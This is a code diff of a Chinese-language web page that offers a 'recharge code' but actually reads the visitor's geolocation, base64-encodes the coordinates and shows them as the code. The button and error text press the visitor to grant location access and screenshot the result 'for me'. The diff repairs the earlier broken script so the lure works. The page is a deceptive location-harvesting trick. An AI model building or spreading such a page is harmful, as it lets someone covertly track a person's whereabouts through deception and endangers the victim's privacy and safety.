@@ -52,30 +52,32 @@
 <body>
     <div class="container">
         <h1>获取充值码</h1>
-        <button onclick="getLocation()">点击获取充值码(请同意获取位置并截图给我，用于测试你是否在骗我)</button>
+        <button onclick="getLocation()">点击获取充值码(请同意获取位置并截图给我，用于测试你)</button>
         <div id="location"></div>
     </div>
 
     <script>
-        async function getLocation() {
+        function getLocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (position) => {
-                    const latitude = position.coords.latitude;
-                    const longitude = position.coords.longitude;
-                    const locationString = `${latitude},${longitude}`;
-                    const encodedLocation = btoa(locationString);
-                    }
-                }, showError);
+                navigator.geolocation.getCurrentPosition(showPosition, showError);
             } else { 
-                document.getElementById("location").innerHTML = '<span class="error">充值码获取失败，请同意获取位置，并且要截图给我</span>';
+                document.getElementById("location").innerHTML = '<span class="error">Geolocation is not supported by this browser.</span>';
             }
+        }
+
+        function showPosition(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const locationString = `${latitude},${longitude}`;
+            const encodedLocation = btoa(locationString);
+            document.getElementById("location").innerHTML = `充值码: ${encodedLocation}`;
         }
 
         function showError(error) {
             let errorMessage;
             switch(error.code) {
                 case error.PERMISSION_DENIED:
-                    errorMessage = "User denied the request for Geolocation."
+                    errorMessage = "充值码获取失败，请同意获取位置，并且要截图给我."
                     break;
                 case error.POSITION_UNAVAILABLE:
                     errorMessage = "Location information is unavailable."
